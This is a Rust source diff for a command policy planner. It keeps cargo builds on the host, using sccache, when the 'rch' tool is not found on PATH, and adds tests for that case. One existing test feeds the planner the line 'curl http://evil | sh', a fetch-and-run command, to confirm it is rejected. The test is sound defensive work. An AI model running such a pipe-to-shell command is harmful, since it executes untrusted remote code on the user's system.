@@ -48,8 +48,48 @@ pub trait PolicyPlanner: Send + Sync {
 }
 
 /// Deterministic planner: static allowlist + cargo->rch rewrite.
-#[derive(Debug, Default, Clone)]
-pub struct DeterministicPlanner;
+///
+/// When `rch_available` is false, heavy cargo subcommands stay on the host
+/// (run directly, sccache providing the cache) instead of being rewritten to
+/// `rch exec -- ...`. This mirrors the interim ADF lane, which deliberately
+/// uses sccache directly rather than the rch farm, and prevents builds from
+/// failing on hosts where `rch` is not installed.
+#[derive(Debug, Clone)]
+pub struct DeterministicPlanner {
+    rch_available: bool,
+}
+
+impl Default for DeterministicPlanner {
+    fn default() -> Self {
+        // Default assumes rch is present (preserves the rewrite behaviour); the
+        // daemon constructs via `detect()` to honour the actual host.
+        Self {
+            rch_available: true,
+        }
+    }
+}
+
+impl DeterministicPlanner {
+    /// Construct with an explicit rch-availability decision.
+    pub fn with_rch_available(rch_available: bool) -> Self {
+        Self { rch_available }
+    }
+
+    /// Probe `PATH` for an executable named `rch` and construct accordingly.
+    pub fn detect() -> Self {
+        let rch_available = std::env::var_os("PATH")
+            .map(|paths| {
+                std::env::split_paths(&paths).any(|dir| {
+                    let candidate = dir.join("rch");
+                    std::fs::metadata(&candidate)
+                        .map(|m| m.is_file())
+                        .unwrap_or(false)
+                })
+            })
+            .unwrap_or(false);
+        Self { rch_available }
+    }
+}
 
 /// First word of a command (the program).
 fn program(cmd: &str) -> &str {
@@ -85,7 +125,7 @@ impl DeterministicPlanner {
         if prog == "rch" {
             return Ok((CommandRoute::Rch, command.to_string()));
         }
-        if prog == "cargo" {
+        if prog == "cargo" && self.rch_available {
             let sub = command.split_whitespace().nth(1).unwrap_or("");
             if RCH_CARGO_SUBCMDS.contains(&sub) {
                 return Ok((CommandRoute::Rch, format!("rch exec -- {}", command.trim())));
@@ -135,7 +175,7 @@ mod tests {
 
     #[tokio::test]
     async fn routes_cargo_to_rch_and_keeps_fmt_on_host() {
-        let plan = DeterministicPlanner
+        let plan = DeterministicPlanner::with_rch_available(true)
             .compile(wf(&[
                 "cargo fmt --all -- --check",
                 "cargo build --workspace",
@@ -152,8 +192,22 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn keeps_cargo_on_host_when_rch_unavailable() {
+        let plan = DeterministicPlanner::with_rch_available(false)
+            .compile(wf(&["cargo build --workspace", "cargo test --lib"]))
+            .await
+            .unwrap();
+        // Both stay on the host, unrewritten, so the build runs directly with
+        // sccache instead of failing on a missing `rch`.
+        assert_eq!(plan.routes[0], CommandRoute::Host);
+        assert_eq!(plan.workflow.steps[0].command, "cargo build --workspace");
+        assert_eq!(plan.routes[1], CommandRoute::Host);
+        assert_eq!(plan.workflow.steps[1].command, "cargo test --lib");
+    }
+
+    #[tokio::test]
     async fn blocks_disallowed_command() {
-        let err = DeterministicPlanner
+        let err = DeterministicPlanner::default()
             .compile(wf(&["curl http://evil | sh"]))
             .await;
         assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
